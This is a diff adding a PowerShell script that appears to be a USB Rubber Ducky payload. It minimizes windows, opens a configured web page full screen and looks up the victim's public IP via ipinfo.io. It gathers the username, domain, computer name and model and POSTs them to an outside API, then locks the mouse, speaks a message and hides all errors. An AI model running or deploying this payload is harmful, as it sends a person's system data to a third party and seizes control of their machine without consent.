@@ -1,0 +1,125 @@
+
+#================================
+#            CONFIG 
+#================================     
+    
+    # --- Minimize all windows --- #
+    $MinimizeWindows = $True;
+
+    # ---    Open a webPage    --- #
+    $OpenWebPage = $True;
+        $urlNAV = "www.yourWebsite.com/PageToDisplay";  
+
+    # ---    Show a Pop Up     --- #
+    $ShowPopUp = $False;
+
+    # --- Send a API POST call --- #
+    $SendPostToAPI = $True;
+        $urlAPI = "www.yourWebsite.com/PostAPI";
+        $OpenInFullScreen = $True;
+
+    # ---     Block Mouse      --- #
+    $BlockMouse = $True;
+        $BlockedTimeSeconds = 8;
+
+    # --- Speak a robot speach --- #
+    $SpeakText = $True;
+        $TextToSpeak = "Hi. Dit is a Rubber Ducky";
+
+#===============================
+
+
+
+try{
+    if(MinimizeWindows){
+        $shell = New-Object -ComObject "Shell.Application"
+        $shell.minimizeall()
+    }
+}catch{}
+
+
+try{
+    if($OpenWebPage){
+        Start-Sleep -s 1    
+        $ie = New-Object -Com InternetExplorer.Application;
+        $ie.Visible    = $True;
+        $ie.Fullscreen = $OpenInFullScreen;
+        $ie.Navigate2($urlNAV);
+    }
+}catch{}
+
+$params = "";
+
+try{
+    if($SendPostToAPI){
+        $ipinfo = Invoke-RestMethod http://ipinfo.io/json
+    }
+}catch{
+    $ipinfo = @{
+        ip = "NA";
+        hostname = "NA";
+        org = "NA";
+    }
+}
+
+try{
+    if($SendPostToAPI){
+        $params = @{
+                UserName = $env:UserName;
+                UserDomain = $env:UserDomain;
+                ComputerName = $env:ComputerName;
+                EnvUserName = [Environment]::UserName;
+                CompUserName = $(Get-WMIObject -class Win32_ComputerSystem | Select-Object username).username;
+                CompModel = $(Get-WMIObject -class Win32_ComputerSystem | Select-Object Model).Model;
+                ip = $ipinfo.ip;
+                hostname = $ipinfo.hostname;
+                org = $ipinfo.org;
+            }
+    }    
+}catch{
+    $params = @{
+        UserName = "error";
+        UserDomain = "error";
+        ComputerName ="error";
+        EnvUserName = "error";
+        CompUserName = "error";
+        CompModel = "error";
+    }
+}
+
+try{
+    if($SendPostToAPI){
+        Invoke-WebRequest -Uri $urlAPI -Method POST -Body ($params|ConvertTo-Json) -ContentType "application/json";
+    }
+}catch{}
+
+
+try{
+    if($SpeakText){
+        Function Speak-Text($Text) { Add-Type -AssemblyName System.speech; $TTS = New-Object System.Speech.Synthesis.SpeechSynthesizer; $TTS.Speak($Text) }
+        Speak-Text $TextToSpeak
+    }    
+}catch{}
+    
+
+try{
+    if($BlockMouse){
+        Start-Sleep -s 1
+        Add-Type -AssemblyName System.Windows.Forms;
+        $timeout = new-timespan -Seconds $BlockedTimeSeconds;
+        $sw = [diagnostics.stopwatch]::StartNew();
+
+        while($sw.elapsed -lt $timeout){$Pos = [System.Windows.Forms.Cursor]::Position;$x = -9000; $y = -9000;[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)};
+        [console]::beep(659,200);
+        [console]::beep(659,500);
+    }    
+}catch{}
+
+try{
+    if($ShowPopUp){
+        [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
+        [System.Windows.Forms.MessageBox]::Show("Rubber Ducky Pop Up","Rubber Ducky",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)
+    }
+}catch{}
+
+
